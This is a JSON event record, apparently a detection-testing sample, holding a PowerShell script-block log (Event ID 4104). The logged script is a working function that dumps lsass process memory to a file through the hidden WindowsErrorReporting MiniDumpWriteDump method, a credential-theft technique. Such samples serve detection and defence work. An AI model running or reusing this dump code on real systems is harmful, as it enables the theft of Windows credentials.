{"body":"{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"3\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2020-06-30T14:24:08.2546050Z\"},\"EventRecordID\":\"971\",\"Correlation\":{\"ActivityID\":\"{4aa5eae3-4f33-0001-3a2b-a64a334fd601}\"},\"Execution\":{\"ProcessID\":\"7008\",\"ThreadID\":\"6488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"MSEDGEWIN10\",\"Security\":{\"UserID\":\"S-1-5-21-3461203602-4096304019-2269080069-1000\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"function Memory($path) { $Process = Get-Process lsass $DumpFilePath = $path $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting') $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic') $Flags = [Reflection.BindingFlags] 'NonPublic, Static' $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags) $MiniDumpWithFullMemory = [UInt32] 2 # $ProcessId = $Process.Id $ProcessName = $Process.Name $ProcessHandle = $Process.Handle $ProcessFileName = \\\"$($ProcessName).dmp\\\" $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create) $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle, $ProcessId, $FileStream.SafeFileHandle, $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)) $FileStream.Close() if (-not $Result) { $Exception = New-Object ComponentModel.Win32Exception $ExceptionMessage = \\\"$($Exception.Message) ($($ProcessName):$($ProcessId))\\\" # Remove any partially written dump files. For example, a partial dump will be written # in the case when 32-bit PowerShell tries to dump a 64-bit process. Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue throw $ExceptionMessage } else { \\\"Memdump complete!\\\" } }\"},{\"Name\":\"ScriptBlockId\",\"text\":\"27f08bda-c330-419f-b83b-eb5c0f699930\"},{\"Name\":\"Path\",\"text\":\"C:\\\\Users\\\\Public\\\\lsass_wer_ps.ps1\"}]}}}","recv_ipv4":"127.0.0.1","recv_time":"2023-06-12T09:58:08.329Z","task_id":"00000000-0000-0000-0000-000000000000","tag":"some_tag","mime":"application/x-pt-eventlog","normalized":false,"input_id":"00000000-0000-0000-0000-000000000000","type":"raw","uuid":"7cced0b4-cdac-49c8-aaa6-5ea771e45623"}